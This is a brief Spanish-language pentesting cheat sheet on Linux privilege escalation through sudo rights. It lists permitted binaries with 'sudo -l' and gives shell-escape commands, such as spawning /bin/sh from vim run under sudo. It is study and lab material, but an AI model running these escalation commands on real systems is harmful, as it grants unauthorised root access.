# Linux: Escalada por Sudo -l

Si tenemos acceso a un usuario con permisos `sudo` sobre algun binario, podemos escalar privilegios.

## Verificar Permisos Sudo

```bash
sudo -l
```

Este comando muestra que binarios puede ejecutar el usuario actual como root.

## Abusar de Binarios Sudo

La pagina [**GTFOBins**](https://gtfobins.github.io/) muestra comandos para escalar privilegios mediante binarios especificos.

### Ejemplo con vim

```bash
sudo vim -c ':!/bin/sh'
```

### Ejemplo genérico

Si un binario permite ejecutar otros comandos:

```bash
sudo /usr/bin/<binario>
!/bin/sh
```

> Usar siempre rutas absolutas (ej. `/usr/bin/vim` en lugar de `vim`).

### Ejemplo con otro binario

```bash
sudo /usr/bin/<binario> /etc/profile
!/bin/sh
```
